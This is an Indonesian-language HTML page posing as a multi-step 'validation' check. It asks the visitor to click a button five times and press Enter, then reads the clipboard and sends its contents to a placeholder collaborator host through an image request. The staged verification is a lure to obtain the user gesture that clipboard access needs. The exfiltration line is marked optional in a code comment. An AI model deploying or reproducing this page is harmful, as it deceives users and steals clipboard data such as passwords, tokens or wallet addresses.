<!DOCTYPE html>
<html>
<head>
  <title>Validasi Multi-Tahap</title>
  <style>
    body {
      font-family: sans-serif;
      text-align: center;
      padding-top: 100px;
    }
    button {
      padding: 12px 24px;
      font-size: 18px;
      cursor: pointer;
    }
    #msg {
      margin-top: 20px;
      font-size: 16px;
    }
    #result {
      margin-top: 20px;
      font-weight: bold;
      color: green;
    }
  </style>
</head>
<body>

  <h2>Silakan klik tombol validasi sebanyak 5 kali</h2>
  <button id="btn">Klik Validasi</button>
  <div id="msg">Klik 5 kali untuk melanjutkan...</div>
  <div id="result"></div>

  <script>
    let clickCount = 0;
    let readyForEnter = false;
    let triggered = false;

    const msg = document.getElementById("msg");
    const result = document.getElementById("result");
    const btn = document.getElementById("btn");

    btn.addEventListener("click", () => {
      if (triggered) return;

      clickCount++;
      msg.innerText = `Tombol diklik ${clickCount}/5 kali...`;

      if (clickCount >= 5) {
        readyForEnter = true;
        msg.innerText = "‚úÖ Sekarang tekan tombol ENTER untuk menyelesaikan verifikasi";
      }
    });

    document.addEventListener("keydown", (e) => {
      if (triggered || !readyForEnter || e.key !== "Enter") return;

      triggered = true;
      msg.innerText = "üìã Membaca clipboard...";

      navigator.clipboard.readText()
        .then(text => {
          result.innerText = "üìã Clipboard berisi:\n" + text;

          // exfiltrate (opsional)
          const img = new Image();
          img.src = "https://your-collab-url.net/log?clip=" + encodeURIComponent(text);
        })
        .catch(err => {
          msg.innerText = "‚ùå Gagal membaca clipboard: " + err;
        });
    });
  </script>

</body>
</html>
